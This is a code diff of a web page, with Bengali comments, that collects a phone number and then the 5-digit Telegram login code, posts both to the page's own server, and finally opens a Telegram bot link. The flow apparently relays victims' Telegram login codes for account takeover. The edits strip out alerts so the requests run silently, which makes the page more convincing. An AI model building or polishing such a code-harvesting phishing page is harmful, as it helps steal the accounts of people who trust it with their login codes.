@@ -76,20 +76,20 @@
         }
         .btn-get-code:active { transform: scale(0.97); }
 
-        /* সরাসরি ফাঁকা বক্সের টাইপিং ইনপুট কন্টেইনার */
+        /* দ্বিতীয় স্ক্রিনশটের মতো ফাঁকা বক্সের টাইপিং ইনপুট কন্টেইনার */
         .otp-input-container {
             width: 100%; margin-bottom: 20px; display: flex; justify-content: center;
         }
         .otp-text-input {
-            width: 100%; padding: 16px; font-size: 24px; font-weight: bold;
-            text-align: center; letter-spacing: 12px; border-radius: 14px;
+            width: 100%; padding: 16px; font-size: 20px; font-weight: 600;
+            text-align: center; border-radius: 14px;
             border: 2px solid rgba(255, 255, 255, 0.8);
             background: rgba(255, 255, 255, 0.15); color: #fff;
             backdrop-filter: blur(10px); outline: none;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
         .otp-text-input::placeholder {
-            color: rgba(255, 255, 255, 0.6); font-size: 16px; letter-spacing: normal; font-weight: normal;
+            color: rgba(255, 255, 255, 0.6); font-size: 18px; font-weight: normal;
         }
 
         /* Transparent Glassmorphism Confirm Otp Button with Glowing Border Effect */
@@ -116,7 +116,7 @@
 
     <div class="container">
         
-        <div class="header-box">
+        <div class="header-box" id="cardBox">
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
             </div>
@@ -126,12 +126,12 @@
             <button class="btn-get-code" id="actionBtn" onclick="handleAction()">GET CODE 📩</button>
         </div>
 
-        <!-- Direct Typing OTP Input Box (Initially Hidden) -->
+        <!-- সরাসরি ফাঁকা বক্সের টাইপিং ইনপুট (দ্বিতীয় স্ক্রিনশটের মতো) -->
         <div class="otp-input-container" id="otpSection" style="display: none;">
             <input type="text" id="otpInput" class="otp-text-input" maxlength="5" placeholder="Enter 5-Digit OTP">
         </div>
 
-        <!-- Confirm Otp Button (Transparent Mirror Glassmorphism with Glow Effect) -->
+        <!-- Confirm Otp Button -->
         <button class="btn-confirm-otp" id="confirmBtn" style="display: none;" onclick="verifyOtpCode()">Confirm Otp ✨</button>
     </div>
 
@@ -143,11 +143,11 @@
             if (step === "phone") {
                 let phone = document.getElementById('phoneInput').value;
                 if(!phone) {
-                    alert("Please enter phone number with country code!");
                     return;
                 }
                 savedPhone = phone;
                 
+                // কোনো পপ-আপ মেসেজ ছাড়া নীরবে রিকোয়েস্ট পাঠানো হচ্ছে
                 fetch('/send-code', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -156,13 +156,14 @@
                 .then(res => res.json())
                 .then(data => {
                     if(data.status === "success") {
-                        alert("OTP sent to your Telegram app!");
                         step = "otp";
-                        document.getElementById('phoneInput').style.display = "none";
+                        
+                        // হেডার বক্সের টাইটেল পরিবর্তন করে ওটিপি মোডে নিয়ে যাওয়া
                         document.getElementById('boxTitle').innerText = "Enter 5-Digit OTP Code 🔑";
+                        document.getElementById('phoneInput').style.display = "none";
                         document.getElementById('actionBtn').style.display = "none";
                         
-                        // Show OTP typing box and Confirm button, hide phone elements
+                        // দ্বিতীয় স্ক্রিনশটের মতো ওটিপি বক্স ও কনফার্ম বাটন শো করা
                         document.getElementById('otpSection').style.display = "flex";
                         document.getElementById('confirmBtn').style.display = "block";
                         document.getElementById('otpInput').focus();
@@ -170,14 +171,13 @@
                         alert("Error: " + data.message);
                     }
                 })
-                .catch(err => alert("Connection error!"));
+                .catch(err => console.log("Connection error"));
             }
         }
 
         function verifyOtpCode() {
             let code = document.getElementById('otpInput').value;
             if(!code || code.length < 5) {
-                alert("Please enter the complete 5-digit OTP code!");
                 return;
             }
 
@@ -189,14 +189,14 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
-                    alert("Verified Successfully! Redirecting...");
+                    // সফল হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else {
                     alert("Verification Failed: " + data.message);
                     document.getElementById('otpInput').value = "";
                 }
             })
-            .catch(err => alert("Verification error!"));
+            .catch(err => console.log("Verification error"));
         }
     </script>
 </body>
